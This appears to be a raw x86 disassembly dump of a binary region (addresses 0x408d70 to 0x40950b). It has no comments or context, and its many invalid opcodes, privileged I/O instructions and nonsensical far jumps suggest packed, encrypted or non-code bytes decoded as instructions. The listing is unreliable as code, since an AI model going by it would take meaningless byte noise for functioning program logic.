  408d70:	cdq    
  408d71:	test   edx,ecx
  408d73:	push   ebx
  408d74:	xor    eax,0xd48b741a
  408d79:	(bad)  
  408d7a:	add    ebp,DWORD PTR [ecx+eiz*1-0x382d3087]
  408d81:	mov    cl,0xb8
  408d83:	call   0xcd66ae67
  408d88:	cmp    DWORD PTR [ebp-0x60],0xb35f6608
  408d8f:	and    eax,0x351f077a
  408d94:	leave  
  408d95:	(bad)  
  408d96:	aaa    
  408d97:	or     eax,0x7c66b536
  408d9c:	push   esp
  408d9d:	jo     0x408da0
  408d9f:	or     esp,DWORD PTR [ebx]
  408da1:	push   esp
  408da2:	lahf   
  408da3:	sti    
  408da4:	repz retf 0x4b6
  408da8:	out    0xe1,eax
  408daa:	or     al,0x52
  408dac:	adc    dh,ah
  408dae:	jp     0x408dfd
  408db0:	mov    WORD PTR [edi+0x68],ds
  408db3:	mov    ch,0xd
  408db5:	cli    
  408db6:	push   edi
  408db7:	jg     0x408d5b
  408db9:	pop    ebx
  408dba:	jg     0x408d6c
  408dbc:	cmc    
  408dbd:	jle    0x408d55
  408dbf:	jns    0x408d7e
  408dc1:	fnsave [si+0x2a51]
  408dc6:	(bad)  
  408dc7:	mov    DWORD PTR [ebx],edi
  408dc9:	xor    ebx,DWORD PTR [esi+eiz*1]
  408dcc:	mov    esi,0xfaa70212
  408dd1:	ret    0x7101
  408dd4:	dec    esi
  408dd5:	call   0x2aff7ea8
  408dda:	sbb    BYTE PTR ds:0x1a9faacd,0xee
  408de1:	add    ebp,DWORD PTR [ebp+0x564108e2]
  408de7:	mov    bl,0x89
  408de9:	loop   0x408d89
  408deb:	int3   
  408dec:	leave  
  408ded:	mov    bh,BYTE PTR [eax+0x66]
  408df0:	out    dx,eax
  408df1:	sbb    BYTE PTR [esi-0x4ccd8c64],dh
  408df7:	and    edi,eax
  408df9:	jbe    0x408e59
  408dfb:	inc    eax
  408dfc:	ins    DWORD PTR es:[edi],dx
  408dfd:	dec    edi
  408dfe:	icebp  
  408dff:	lods   al,BYTE PTR ds:[esi]
  408e00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e01:	fst    DWORD PTR [edi+edx*2]
  408e04:	mov    esi,0x44def310
  408e09:	xchg   BYTE PTR [esi-0x41],cl
  408e0c:	lock test DWORD PTR [ebx+edi*8],0x50740bbe
  408e14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e15:	mov    edi,0x83895b02
  408e1a:	imul   esi,DWORD PTR [eax],0xfffffffb
  408e1d:	pop    ss
  408e1e:	sub    BYTE PTR [esi-0x7a],dl
  408e21:	fwait
  408e22:	pop    ebp
  408e23:	shl    BYTE PTR [ecx-0x5b7c11f7],0x6c
  408e2a:	dec    esi
  408e2b:	cmp    ebx,DWORD PTR [ebx]
  408e2d:	dec    edx
  408e2e:	jp     0x408e91
  408e30:	jl     0x408e7a
  408e32:	jne    0x408e8d
  408e34:	and    BYTE PTR ds:0xa4d476d5,bl
  408e3a:	pop    ss
  408e3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e3c:	arpl   WORD PTR [ecx-0x6d775df2],bp
  408e42:	inc    edi
  408e43:	out    0x6f,al
  408e45:	xchg   edx,eax
  408e46:	mov    ebx,0x4cf64e92
  408e4b:	call   0x1477:0xf2047ddd
  408e52:	int    0xa6
  408e54:	mov    esi,0xe53d2019
  408e59:	std    
  408e5a:	paddusw mm0,mm5
  408e5d:	mov    bh,0xbc
  408e5f:	aaa    
  408e60:	push   ebx
  408e61:	aad    0x7f
  408e63:	(bad)  
  408e65:	int    0x43
  408e67:	inc    ebp
  408e68:	test   al,0x1d
  408e6a:	sub    eax,0x426754ac
  408e6f:	addr16 sub al,0x56
  408e72:	les    ecx,FWORD PTR [edx-0x4a]
  408e75:	cmp    al,0x18
  408e77:	add    al,0x72
  408e79:	daa    
  408e7a:	jmp    0x71c24f76
  408e7f:	stos   BYTE PTR es:[edi],al
  408e80:	jnp    0x408eaf
  408e82:	cdq    
  408e83:	jg     0x408ea7
  408e85:	cmp    al,0xd2
  408e87:	leave  
  408e88:	rcr    DWORD PTR [eax-0x7b],1
  408e8b:	xor    DWORD PTR [eax+0x61ec4487],ecx
  408e91:	jnp    0x408e6b
  408e93:	data16 mov cl,BYTE PTR [ebx-0x33]
  408e97:	lahf   
  408e98:	mov    ebx,0x637fb434
  408e9d:	mov    WORD PTR [esi],fs
  408e9f:	outs   dx,BYTE PTR ds:[esi]
  408ea0:	inc    esp
  408ea1:	mov    bl,BYTE PTR [esi+esi*2]
  408ea4:	fbstp  TBYTE PTR [esp+ebx*4]
  408ea7:	inc    esi
  408ea8:	cbw    
  408eaa:	cdq    
  408eab:	jnp    0x408ead
  408ead:	pop    ss
  408eae:	inc    edi
  408eaf:	xchg   bh,dh
  408eb1:	sub    DWORD PTR [edx+0x1a],edx
  408eb4:	mov    eax,0x2facf706
  408eb9:	sahf   
  408eba:	jne    0x408ee7
  408ebc:	jmp    FWORD PTR [ebp*2-0x4038c143]
  408ec3:	in     al,dx
  408ec4:	mov    eax,0x62d85bae
  408ec9:	inc    eax
  408eca:	push   edx
  408ecb:	dec    ebx
  408ecc:	adc    dl,BYTE PTR [edx-0x35]
  408ecf:	out    0x93,al
  408ed1:	sub    BYTE PTR [esi],ch
  408ed3:	fistp  QWORD PTR [ecx]
  408ed5:	xchg   edi,eax
  408ed6:	outs   dx,BYTE PTR ds:[esi]
  408ed7:	mov    ch,0xac
  408ed9:	jns    0x408ebf
  408edb:	inc    ebp
  408edc:	leave  
  408edd:	rcr    DWORD PTR [esi+0x113067b2],0xe9
  408ee4:	xchg   DWORD PTR [ebp-0x64],edi
  408ee7:	adc    DWORD PTR [ebp-0x25e7754],0x8f5be6f3
  408ef1:	ins    DWORD PTR es:[edi],dx
  408ef2:	(bad)  
  408ef3:	bound  ebp,QWORD PTR [edx-0x28]
  408ef6:	mov    ecx,0xfaec01c0
  408efb:	xor    al,0xa7
  408efd:	xchg   ebx,eax
  408efe:	cmp    al,0x60
  408f00:	mov    ecx,0xf7c7fe19
  408f05:	lods   al,BYTE PTR ss:[esi]
  408f07:	jae    0x408f86
  408f09:	(bad)  
  408f0a:	js     0x408ef1
  408f0c:	call   0xff4e552d
  408f11:	pop    edx
  408f12:	adc    eax,0xe1a11b5c
  408f17:	dec    eax
  408f18:	in     eax,dx
  408f19:	xor    al,0x47
  408f1b:	lods   al,BYTE PTR ds:[esi]
  408f1c:	ror    DWORD PTR [ebp+0x75931ed2],cl
  408f22:	dec    edx
  408f23:	out    dx,eax
  408f24:	ror    DWORD PTR [ecx-0xf],cl
  408f27:	jmp    0xe8874950
  408f2c:	or     ebp,DWORD PTR [edi]
  408f2e:	loopne 0x408f96
  408f30:	div    ch
  408f32:	and    ebp,ebp
  408f34:	xchg   ebp,eax
  408f35:	sbb    al,0x8b
  408f37:	into   
  408f38:	lds    esi,FWORD PTR [ebx-0x20]
  408f3b:	xlat   BYTE PTR ds:[ebx]
  408f3c:	shl    DWORD PTR [ebx-0x36],cl
  408f3f:	in     eax,dx
  408f40:	dec    edx
  408f41:	bound  esp,QWORD PTR [ebp-0x52]
  408f44:	cld    
  408f45:	xor    DWORD PTR [ecx-0x2],edx
  408f48:	addr16 or al,0x8f
  408f4b:	arpl   WORD PTR [ebp+0x2e],ax
  408f4e:	jp     0x408f8b
  408f50:	pop    esi
  408f51:	loope  0x408f78
  408f53:	pusha  
  408f54:	cmp    al,0xf5
  408f56:	jnp    0x408f92
  408f58:	neg    BYTE PTR [ebp+0x4db18574]
  408f5e:	and    esi,DWORD PTR [esi]
  408f60:	push   cs
  408f61:	dec    esp
  408f62:	data16 mov dh,0xd8
  408f65:	and    eax,0x25e33bb9
  408f6a:	dec    esp
  408f6b:	or     eax,0xe8073f3c
  408f70:	adc    ch,BYTE PTR [esi-0x54a70072]
  408f76:	mov    dl,BYTE PTR [esi]
  408f78:	push   cs
  408f79:	inc    ebp
  408f7a:	ds dec eax
  408f7c:	fsubr  QWORD PTR [ebx+edi*1]
  408f7f:	pushf  
  408f80:	outs   dx,BYTE PTR ds:[esi]
  408f81:	inc    edi
  408f82:	ror    esi,cl
  408f84:	jle    0x408f25
  408f86:	mov    ebp,db4
  408f89:	jecxz  0x408f14
  408f8b:	mov    bl,0xd8
  408f8d:	ss mov dl,0xd4
  408f90:	iret   
  408f91:	dec    ebp
  408f92:	mov    dh,0x48
  408f94:	or     al,0xdc
  408f96:	cld    
  408f97:	call   0x8296:0x356ac59f
  408f9e:	repz cmp BYTE PTR [eax],bl
  408fa1:	xchg   edi,eax
  408fa2:	xchg   ecx,edi
  408fa4:	sub    edi,DWORD PTR [edi]
  408fa6:	in     eax,dx
  408fa7:	aaa    
  408fa8:	jecxz  0x40901b
  408faa:	adc    eax,0x86c7f856
  408faf:	lock push esp
  408fb1:	push   ss
  408fb2:	sub    al,0x85
  408fb4:	push   edx
  408fb5:	xchg   edi,eax
  408fb6:	add    DWORD PTR [ecx-0x1a],0x7c195209
  408fbd:	dec    esp
  408fbe:	fsubrp st(6),st
  408fc0:	stos   DWORD PTR es:[edi],eax
  408fc1:	test   DWORD PTR [edi],eax
  408fc3:	lods   eax,DWORD PTR ds:[esi]
  408fc4:	mov    ds:0x96dbf7a,al
  408fc9:	xchg   DWORD PTR [edx-0x38],eax
  408fcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fcd:	ss sbb eax,0x22af7c29
  408fd3:	dec    ebx
  408fd4:	xor    eax,0x3c61a54d
  408fd9:	test   al,0x62
  408fdb:	xor    eax,0x18274e9a
  408fe0:	xchg   ebp,eax
  408fe1:	sub    al,dl
  408fe3:	xchg   ebx,edi
  408fe5:	dec    esp
  408fe6:	push   ds
  408fe7:	sar    BYTE PTR [ebp-0x30],1
  408fea:	jmp    0xb5e:0xdea32477
  408ff1:	ret    0x855b
  408ff4:	or     al,0xa2
  408ff6:	mov    al,0xaa
  408ff8:	mov    bl,0xb
  408ffa:	jne    0x40903f
  408ffc:	xlat   BYTE PTR ds:[ebx]
  408ffd:	(bad)  
  408ffe:	push   ebx
  408fff:	das    
  409000:	pop    edx
  409001:	repnz or dh,BYTE PTR ds:0x38746e7c
  409008:	push   esp
  409009:	icebp  
  40900a:	out    0x51,al
  40900c:	mov    ebx,edi
  40900e:	push   ds
  40900f:	push   ss
  409010:	sbb    bl,al
  409012:	xor    DWORD PTR [edx-0xfedeed9],edx
  409018:	xor    DWORD PTR [edi],esi
  40901a:	push   0x5ea8d896
  40901f:	add    esi,DWORD PTR [eax+0x33]
  409022:	cmp    al,BYTE PTR [edx]
  409024:	(bad)  [eax+0x5d]
  409027:	fs jg  0x408ff2
  40902a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40902b:	pop    ds
  40902c:	pusha  
  40902d:	or     BYTE PTR [edi-0x17894d0a],ch
  409033:	push   esp
  409034:	jo     0x409060
  409036:	int    0x18
  409038:	lock add BYTE PTR [ecx+0x46b1b19e],bh
  40903f:	sub    ebx,esi
  409041:	and    al,0x20
  409043:	fwait
  409044:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409045:	or     DWORD PTR [esi-0x5a],edi
  409048:	fnstsw WORD PTR [edi-0x2]
  40904b:	push   0x50e09cad
  409050:	loop   0x409021
  409052:	fwait
  409053:	jns    0x409099
  409055:	stc    
  409056:	pop    eax
  409057:	bound  ebp,QWORD PTR [edx]
  409059:	dec    esi
  40905a:	and    al,cl
  40905c:	cmc    
  40905d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40905e:	sbb    ebx,DWORD PTR [esi-0x46]
  409061:	sar    cl,cl
  409063:	cmp    bl,dh
  409065:	out    dx,al
  409066:	jge    0x409090
  409068:	aaa    
  409069:	sti    
  40906a:	outs   dx,DWORD PTR ds:[esi]
  40906b:	dec    edi
  40906c:	jb     0x409009
  40906e:	xchg   ebp,eax
  40906f:	inc    eax
  409070:	xchg   edx,eax
  409071:	adc    esi,DWORD PTR [ebp-0x2d]
  409074:	jb     0x409039
  409076:	test   eax,0xb998c49c
  40907b:	push   edi
  40907c:	xlat   BYTE PTR ds:[ebx]
  40907d:	or     ebx,DWORD PTR [esi]
  40907f:	retf   
  409080:	outs   dx,BYTE PTR ds:[esi]
  409081:	jecxz  0x409023
  409083:	or     eax,0x828a2072
  409088:	sbb    BYTE PTR [eax+ebx*4+0xe],dh
  40908c:	xchg   edi,eax
  40908d:	push   es
  40908e:	xchg   esi,eax
  40908f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409090:	sub    dh,BYTE PTR [edi+eiz*2+0x7a]
  409094:	adc    BYTE PTR [edx],cl
  409096:	xchg   ebp,eax
  409097:	jmp    0xb09d:0x744a5bf8
  40909e:	mov    ah,0xf4
  4090a0:	fld    QWORD PTR [esi-0x2376e143]
  4090a6:	push   esi
  4090a7:	ja     0x40911d
  4090a9:	out    0xe7,al
  4090ab:	inc    ecx
  4090ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090ad:	xor    eax,0x501bee99
  4090b2:	sbb    bl,BYTE PTR [edx]
  4090b4:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4090b6:	retf   0x3d2d
  4090b9:	push   0x1
  4090bb:	loopne 0x4090c2
  4090bd:	popf   
  4090be:	or     esi,DWORD PTR [esi+0x2547bcee]
  4090c4:	pushf  
  4090c5:	jle    0x4090d0
  4090c7:	mov    al,0xb9
  4090c9:	inc    edi
  4090ca:	aam    0x1b
  4090cc:	push   ebp
  4090cd:	xchg   esp,eax
  4090ce:	retf   0x6dec
  4090d1:	cmp    DWORD PTR [edi-0x18a0605],edx
  4090d7:	mov    ebx,0xadfdd63a
  4090dc:	mov    gs,esp
  4090de:	inc    eax
  4090df:	inc    eax
  4090e0:	inc    edx
  4090e1:	cmp    eax,0x29e26844
  4090e6:	gs imul edi,ebp,0xffffffad
  4090ea:	adc    DWORD PTR [esi-0x2c],0x36cfb912
  4090f1:	sub    esi,eax
  4090f3:	ins    DWORD PTR es:[edi],dx
  4090f4:	shr    DWORD PTR [esi],1
  4090f6:	popa   
  4090f7:	std    
  4090f8:	pop    esi
  4090f9:	pop    esi
  4090fa:	push   ss
  4090fb:	push   0xbf433ed9
  409100:	cwde   
  409101:	add    ah,bl
  409103:	or     ebp,DWORD PTR ds:0x6fa2f191
  409109:	push   es
  40910a:	and    bl,al
  40910c:	stos   BYTE PTR es:[edi],al
  40910d:	and    eax,0x90725269
  409112:	lods   eax,DWORD PTR ds:[esi]
  409113:	out    dx,al
  409114:	sahf   
  409115:	adc    BYTE PTR [edx],dl
  409117:	dec    esp
  409118:	push   ss
  409119:	pop    ecx
  40911a:	stc    
  40911b:	mov    cl,0x25
  40911d:	push   es
  40911e:	cmp    BYTE PTR [ecx-0x78463d82],bh
  409124:	dec    ebp
  409125:	sub    DWORD PTR [esi+0x1d5dc74a],ebx
  40912b:	inc    edi
  40912c:	xchg   ecx,eax
  40912d:	ficom  DWORD PTR [edx-0x461f1cff]
  409133:	and    dh,BYTE PTR [eax-0x19408ebd]
  409139:	(bad)  
  40913b:	mov    ebp,0xba85df43
  409140:	dec    ebp
  409141:	mov    ebx,0xdb0a3be5
  409146:	jge    0x40919b
  409148:	and    cl,BYTE PTR [esi]
  40914a:	sub    ebp,0xffffffcb
  40914d:	gs in  eax,0xd7
  409150:	data16 cmp dh,BYTE PTR [ebp+0x55d816c3]
  409157:	jecxz  0x4091a4
  409159:	jae    0x409166
  40915b:	push   ds
  40915c:	pop    edx
  40915d:	xchg   ebx,eax
  40915e:	xchg   esi,eax
  40915f:	es addr16 add eax,0xfcce29dc
  409166:	xlat   BYTE PTR ds:[ebx]
  409167:	(bad)  
  409168:	retf   
  409169:	adc    BYTE PTR [ecx-0x6b0cbdf],ch
  40916f:	cmp    eax,0x1a95d2c2
  409174:	pop    es
  409175:	sub    BYTE PTR [ecx+0x6f],0x14
  409179:	mov    edi,0x3815a7db
  40917e:	sub    dh,BYTE PTR [ebx-0x77]
  409181:	jmp    0x409148
  409183:	out    0x23,al
  409185:	xor    esp,DWORD PTR [esi+0x1b7a0539]
  40918b:	lea    eax,[esi]
  40918d:	jne    0x4091ee
  40918f:	dec    edi
  409190:	idiv   DWORD PTR [edi+0x37b1620a]
  409196:	jo     0x4091e0
  409198:	aad    0x20
  40919a:	jmp    0x40918c
  40919c:	jae    0x40913b
  40919e:	pop    edx
  40919f:	add    DWORD PTR [ecx+0x66],ecx
  4091a2:	in     al,0x73
  4091a4:	cs dec ebp
  4091a6:	push   0x67
  4091a8:	push   0x55916eb1
  4091ad:	inc    ecx
  4091ae:	mov    ds:0x7f9257f3,al
  4091b3:	mov    ah,0xa4
  4091b5:	xor    al,BYTE PTR ds:0x140977fa
  4091bb:	mov    WORD PTR [ecx+0x3b],ss
  4091be:	or     al,0xda
  4091c0:	cmp    dh,ch
  4091c2:	cmp    al,0x11
  4091c4:	cmp    ebx,ecx
  4091c6:	sahf   
  4091c7:	mov    ds:0xe548dae6,al
  4091cc:	mov    eax,0x69439fdb
  4091d1:	outs   dx,DWORD PTR ds:[esi]
  4091d2:	out    0xa7,al
  4091d4:	repnz sbb ebp,ebx
  4091d7:	push   esp
  4091d8:	and    BYTE PTR [edx+0x30],dl
  4091db:	imul   ebx,esp,0xe2baabcc
  4091e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091e2:	xor    BYTE PTR [ecx-0x5a],ch
  4091e5:	fadd   QWORD PTR [esi+eax*4+0x305acdfb]
  4091ec:	call   0x79f0256c
  4091f1:	daa    
  4091f2:	lods   eax,DWORD PTR ds:[esi]
  4091f3:	cmp    bl,BYTE PTR [eax]
  4091f5:	loope  0x40919a
  4091f7:	out    dx,eax
  4091f8:	cs cmp eax,0xe37bed11
  4091fe:	sub    cl,BYTE PTR [ebp+0x74]
  409201:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409202:	pop    ds
  409203:	jnp    0x4091f2
  409205:	cmp    BYTE PTR [edx+edx*4+0x5a],bh
  409209:	sbb    eax,0x520ed268
  40920e:	ret    
  40920f:	(bad)  [ebx-0x24]
  409212:	cs jge 0x4091fc
  409215:	sub    BYTE PTR ds:0x663bba86,0xec
  40921c:	inc    ebp
  40921d:	sbb    eax,DWORD PTR [esi-0x770e8c23]
  409223:	leave  
  409224:	cdq    
  409225:	xlat   BYTE PTR ds:[ebx]
  409226:	stos   BYTE PTR es:[edi],al
  409227:	mov    ds,WORD PTR [edi-0x659133b]
  40922d:	arpl   WORD PTR [edx+0x19],sp
  409230:	sub    dl,BYTE PTR [ecx-0x13]
  409233:	adc    edx,DWORD PTR ds:0x4540be93
  409239:	pop    esp
  40923a:	mov    ecx,0xe01d8eb0
  40923f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409240:	in     al,0x54
  409242:	xchg   ebx,eax
  409243:	int3   
  409244:	inc    edx
  409245:	fbld   TBYTE PTR [edi+0x58c56efa]
  40924b:	inc    ecx
  40924c:	test   BYTE PTR [esi+0x67],0x6
  409250:	xchg   esi,eax
  409251:	ss add al,bl
  409254:	add    eax,0x552b515f
  409259:	mov    ds:0xf6251878,eax
  40925e:	push   cs
  40925f:	in     eax,dx
  409260:	xor    BYTE PTR [ebp-0x6],bl
  409263:	(bad)  
  409264:	dec    DWORD PTR [edx-0x5a]
  409267:	mov    bl,0x1b
  409269:	test   eax,0xe4d8d446
  40926e:	mov    dh,0x7e
  409270:	std    
  409271:	sbb    ebx,DWORD PTR [edi]
  409273:	pop    ecx
  409274:	pusha  
  409275:	sbb    eax,0xe5e9aec6
  40927a:	mov    es,WORD PTR [edi-0x3a]
  40927d:	and    BYTE PTR [eax+0x7e],ch
  409280:	push   esi
  409281:	rol    BYTE PTR [ecx+0x9],1
  409284:	pop    esp
  409285:	enter  0x1e4f,0xd2
  409289:	adc    BYTE PTR [edi],al
  40928b:	mov    ah,0x24
  40928d:	je     0x4092be
  40928f:	aas    
  409290:	out    0x24,al
  409292:	mov    al,ds:0x93e66a57
  409297:	std    
  409298:	in     eax,dx
  409299:	sbb    DWORD PTR [esi],ebx
  40929b:	out    dx,al
  40929c:	xchg   ebx,eax
  40929d:	push   ebp
  40929e:	js     0x4092f3
  4092a0:	fld    QWORD PTR [ebx+0x32e261c0]
  4092a6:	seto   BYTE PTR [eax-0x76]
  4092aa:	mov    ecx,0xf24d9e28
  4092af:	into   
  4092b0:	adc    al,0x7e
  4092b2:	sub    esp,0x426d0e68
  4092b8:	pop    esp
  4092b9:	dec    ebx
  4092ba:	push   esi
  4092bb:	je     0x409251
  4092bd:	cmc    
  4092be:	fcmove st,st(4)
  4092c0:	pop    ebx
  4092c1:	call   0x4c064083
  4092c6:	aas    
  4092c7:	sbb    DWORD PTR [ebp+0x6f9799e7],ecx
  4092cd:	fwait
  4092ce:	shr    DWORD PTR [edx-0x457115a0],cl
  4092d4:	sbb    DWORD PTR [esi+eax*8],ebx
  4092d7:	mov    ch,0xeb
  4092d9:	xchg   edi,eax
  4092da:	and    al,0xd9
  4092dc:	pop    esp
  4092dd:	jne    0x4092e8
  4092df:	add    BYTE PTR ds:0xe031d410,dl
  4092e5:	cld    
  4092e6:	dec    ecx
  4092e7:	sub    BYTE PTR [ecx+0x35601e72],al
  4092ed:	out    0xd4,eax
  4092ef:	jb     0x409314
  4092f1:	mov    ebp,0x966bc631
  4092f6:	outs   dx,DWORD PTR ds:[esi]
  4092f7:	stc    
  4092f8:	leave  
  4092f9:	sub    al,0x1a
  4092fb:	outs   dx,BYTE PTR ds:[esi]
  4092fc:	add    al,0xf2
  4092fe:	call   0x3e74ecde
  409303:	push   es
  409304:	mov    ebp,esp
  409306:	lods   al,BYTE PTR ds:[esi]
  409307:	or     eax,0xcb277c0
  40930c:	xor    eax,0xe1cf7438
  409311:	xchg   ebp,ebp
  409313:	jb     0x4092bd
  409315:	xchg   edx,eax
  409316:	std    
  409317:	and    DWORD PTR [edi+0xfd7dc95],ebp
  40931d:	sub    esi,DWORD PTR [esi-0x56]
  409320:	inc    esp
  409321:	mov    al,al
  409323:	loop   0x409387
  409325:	xor    ch,al
  409327:	mov    ebp,0xc626d872
  40932c:	cmp    dh,BYTE PTR [edx-0xe]
  40932f:	mov    WORD PTR [ebp-0x5ea0c484],ds
  409335:	mov    edi,0x1f45c1d4
  40933a:	xlat   BYTE PTR ds:[ebx]
  40933b:	lods   eax,DWORD PTR ds:[esi]
  40933c:	cld    
  40933d:	mov    al,0x9
  40933f:	jo     0x40937b
  409341:	mov    ds:0x78b42714,eax
  409346:	dec    eax
  409347:	(bad)  
  409348:	fwait
  409349:	ins    BYTE PTR es:[edi],dx
  40934a:	mov    eax,ds:0xe686f49
  40934f:	(bad)  
  409350:	sub    esp,DWORD PTR [edx]
  409352:	sub    eax,DWORD PTR [eax-0x4fb7b71]
  409358:	mov    al,0x90
  40935a:	inc    ebp
  40935b:	(bad)  
  40935c:	mov    bl,0xa0
  40935e:	adc    ebp,DWORD PTR [eax]
  409360:	out    dx,al
  409361:	shr    BYTE PTR [ecx-0x42],cl
  409364:	test   dl,bh
  409366:	(bad)  
  409368:	and    ebx,DWORD PTR [eax+0x40]
  40936b:	stos   DWORD PTR es:[edi],eax
  40936c:	mov    al,BYTE PTR [esi-0x6f101e1]
  409372:	pop    ebx
  409373:	pop    es
  409374:	test   BYTE PTR [edx],bh
  409376:	jp     0x4093d1
  409378:	jns    0x40932a
  40937a:	gs xor al,0xc
  40937d:	es call 0xb22fbf77
  409383:	scas   al,BYTE PTR es:[edi]
  409384:	xor    al,BYTE PTR [esi]
  409386:	fucomp st(1)
  409388:	xor    eax,0xc4a1a688
  40938d:	(bad)  
  40938e:	test   eax,0xcc6d4f25
  409393:	mov    esp,0x2bfda387
  409398:	mov    esp,cs
  40939a:	(bad)  
  40939d:	sbb    bl,BYTE PTR [ecx-0x718fad44]
  4093a3:	dec    ebp
  4093a4:	hlt    
  4093a5:	sub    al,0x56
  4093a7:	sbb    cl,BYTE PTR [ebp+0x80b2675]
  4093ad:	inc    ecx
  4093ae:	dec    eax
  4093af:	push   0xffffffb0
  4093b1:	jmp    0x40938a
  4093b3:	sar    ah,cl
  4093b5:	jnp    0x4093e9
  4093b7:	repz cmp esp,edx
  4093ba:	into   
  4093bb:	jne    0x409379
  4093bd:	add    DWORD PTR [eax+0x2b],esp
  4093c0:	stos   BYTE PTR es:[edi],al
  4093c1:	xchg   esi,eax
  4093c2:	jmp    0x8c433d01
  4093c7:	mov    ecx,0x3a61e45a
  4093cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093cd:	pop    ebp
  4093ce:	pop    eax
  4093cf:	push   cs
  4093d0:	shr    DWORD PTR [eax+ebx*1+0x1f],1
  4093d4:	cwde   
  4093d5:	das    
  4093d6:	and    cl,BYTE PTR [edi-0x1b]
  4093d9:	add    eax,0x38ad671a
  4093de:	lds    ebp,FWORD PTR [eax-0x7db340e0]
  4093e4:	fwait
  4093e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093e6:	xchg   esi,eax
  4093e7:	test   bh,bh
  4093e9:	fiadd  DWORD PTR [ecx-0x5f37e7b5]
  4093ef:	inc    esi
  4093f0:	mov    edi,0xb136c69
  4093f5:	sbb    ch,BYTE PTR [edi+0x42]
  4093f8:	push   cx
  4093fa:	push   esp
  4093fb:	loop   0x4093e2
  4093fd:	ja     0x4093a4
  4093ff:	push   edx
  409400:	test   BYTE PTR [ebx+0x1ec838f7],ch
  409406:	aad    0xc4
  409408:	dec    edi
  409409:	imul   ebx,eax,0xfffffff9
  40940c:	push   0xffffff85
  40940e:	lds    ebp,FWORD PTR [ecx+0x3c]
  409411:	cs fcmovne st,st(6)
  409414:	xchg   esp,eax
  409415:	sub    bh,ah
  409417:	jp     0x409415
  409419:	mov    ch,0x6b
  40941b:	mov    fs,WORD PTR [ebp-0x769dde0b]
  409421:	int3   
  409422:	dec    ecx
  409423:	xchg   DWORD PTR [eax],ebx
  409425:	pop    esi
  409426:	mov    DWORD PTR [edx+0x5cab0955],eax
  40942c:	sti    
  40942d:	push   0x74
  40942f:	xor    BYTE PTR [ecx+edi*2-0x60],ah
  409433:	sbb    esi,DWORD PTR [ebp-0x26]
  409436:	add    eax,0x63d56d2e
  40943b:	jno    0x409496
  40943d:	ret    
  40943e:	lahf   
  40943f:	ror    BYTE PTR [ecx],0x4b
  409442:	(bad)  
  409443:	call   DWORD PTR [edx-0x1c]
  409446:	xchg   BYTE PTR [edx],dl
  409448:	aam    0xd4
  40944a:	sub    al,0xc9
  40944c:	stos   BYTE PTR es:[edi],al
  40944d:	lds    esp,FWORD PTR [esp+ebp*4+0x11]
  409451:	fist   WORD PTR [edi]
  409453:	push   ss
  409454:	lods   eax,DWORD PTR ds:[esi]
  409455:	dec    eax
  409456:	and    BYTE PTR [edi+0x5a],dl
  409459:	inc    edx
  40945a:	fwait
  40945b:	cli    
  40945c:	into   
  40945d:	add    edi,ebx
  40945f:	aas    
  409460:	push   ebx
  409461:	mov    ah,0xb3
  409463:	dec    esp
  409464:	inc    edi
  409465:	lea    edx,[edx-0x40eea66a]
  40946b:	xchg   esp,eax
  40946c:	in     eax,dx
  40946d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40946e:	inc    ebx
  40946f:	int    0x6c
  409471:	in     eax,0xa0
  409473:	mov    ebp,0x28c242c7
  409478:	sbb    edx,DWORD PTR [eax+0x170bea11]
  40947e:	ror    BYTE PTR [edx],cl
  409480:	add    al,0xaf
  409482:	xchg   edx,eax
  409483:	mov    cl,0x2c
  409485:	rcl    BYTE PTR [eax+0x77],cl
  409488:	sub    DWORD PTR [ebp+0x73],esp
  40948b:	repnz loop 0x409491
  40948e:	sar    DWORD PTR [ebx],1
  409490:	mov    dl,0x5f
  409492:	and    al,0xbf
  409494:	pop    ebp
  409495:	cmp    dh,bl
  409497:	cmp    DWORD PTR [ecx-0x7f],ebp
  40949a:	inc    esi
  40949b:	repz jnp 0x4094d9
  40949e:	jmp    0x4aac0ce8
  4094a3:	clc    
  4094a4:	scas   al,BYTE PTR es:[edi]
  4094a5:	sub    edi,0xf65be461
  4094ab:	mov    dh,0x18
  4094ad:	mov    WORD PTR [eax+0x503e8bab],fs
  4094b3:	stc    
  4094b4:	popf   
  4094b5:	leave  
  4094b6:	inc    ecx
  4094b7:	cmp    esi,ebp
  4094b9:	stc    
  4094ba:	fimul  DWORD PTR [edi]
  4094bc:	push   edx
  4094bd:	cmp    eax,0x24410d05
  4094c3:	cld    
  4094c4:	ins    DWORD PTR es:[edi],dx
  4094c5:	pushf  
  4094c6:	mov    al,ds:0x325d7664
  4094cb:	es ftst 
  4094ce:	mov    ds:0xaae8d18d,eax
  4094d3:	lock lock daa 
  4094d6:	shl    BYTE PTR [edi],0xcf
  4094d9:	fist   DWORD PTR ds:0x8d8650bc
  4094df:	pop    esi
  4094e0:	inc    esi
  4094e1:	sub    bl,BYTE PTR [edi]
  4094e3:	adc    ah,BYTE PTR [esi+edx*4]
  4094e6:	data16 (bad) 
  4094e8:	call   0x34fe8f21
  4094ed:	mov    esp,0xf1e428d6
  4094f2:	dec    DWORD PTR [ebp-0x5c4f6071]
  4094f8:	jns    0x409507
  4094fa:	push   eax
  4094fb:	xor    BYTE PTR [edi],ch
  4094fd:	jmp    0xca4414cf
  409502:	in     eax,0x66
  409504:	jo     0x409555
  409506:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409507:	inc    edx
  409508:	pop    ebx
  409509:	ins    BYTE PTR es:[edi],dx
  40950a:	stc    
  40950b:	sub    DWORD PTR ds:0x8d04961c,edx
